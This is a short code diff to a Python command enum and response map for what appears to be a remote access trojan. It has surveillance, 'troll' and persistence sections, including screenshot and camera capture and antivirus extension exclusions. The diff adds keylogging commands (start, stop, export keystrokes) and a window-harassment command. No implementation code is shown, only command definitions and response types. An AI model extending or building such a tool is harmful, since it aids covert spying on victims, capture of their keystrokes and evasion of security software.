@@ -36,7 +36,11 @@ class Command(Enum):
     DISABLE_WINDOW_STATUS = "DISABLE_WINDOW_STATUS"
 
     # Surveillance Commands
-    SCREENSHOT = "SCREENSHOT"
+    SCREENSHOT = "SCREENSHOT"    
+    START_KEYLOG = "START_KEYLOG"
+    STOP_KEYLOG = "STOP_KEYLOG"
+    EXPORT_KEYLOG_TEXT = "EXPORT_KEYLOG_TEXT"
+
     GET_AVAILABLE_DEVICES = "GET_AVAILABLE_DEVICES"
     START_CAMERA = "START_CAMERA"
 
@@ -95,7 +99,8 @@ class Command(Enum):
     STOP_CD_EJECTOR = "STOP_CD_EJECTOR"
     TYPE_MESSAGE_NOTEPAD = "TYPE_MESSAGE_NOTEPAD"
     SHOW_WEBSITE = "SHOW_WEBSITE"
-
+    START_WINDOW_TROLL = "START_WINDOW_TROLL"
+    STOP_WINDOW_TROLL = "STOP_WINDOW_TROLL"
     # Persistence Commands
     ADD_EXTENSION_EXCLUSION = "ADD_EXTENSION_EXCLUSION"
     REMOVE_EXTENSION_EXCLUSION = "REMOVE_EXTENSION_EXCLUSION"
@@ -148,6 +153,9 @@ command_response_map = {
     Command.SCREENSHOT: ResponseType.JSON_RESPONSE,
     Command.GET_AVAILABLE_DEVICES: ResponseType.JSON_RESPONSE,
     Command.START_CAMERA: ResponseType.STREAM,
+    Command.START_KEYLOG: ResponseType.JSON_RESPONSE,
+    Command.STOP_KEYLOG: ResponseType.JSON_RESPONSE,
+    Command.EXPORT_KEYLOG_TEXT: ResponseType.JSON_RESPONSE,
 
     # System Commands
     # Assuming JSON_RESPONSE for informational commands and FILE_RESPONSE for any commands that result in downloads
@@ -204,7 +212,8 @@ command_response_map = {
     Command.STOP_CD_EJECTOR: ResponseType.JSON_RESPONSE,
     Command.TYPE_MESSAGE_NOTEPAD: ResponseType.JSON_RESPONSE,
     Command.SHOW_WEBSITE: ResponseType.JSON_RESPONSE,
-
+    Command.START_WINDOW_TROLL : ResponseType.JSON_RESPONSE,
+    Command.STOP_WINDOW_TROLL : ResponseType.JSON_RESPONSE,
     # Persistence Commands
     Command.ADD_EXTENSION_EXCLUSION: ResponseType.JSON_RESPONSE,
     Command.REMOVE_EXTENSION_EXCLUSION: ResponseType.JSON_RESPONSE,
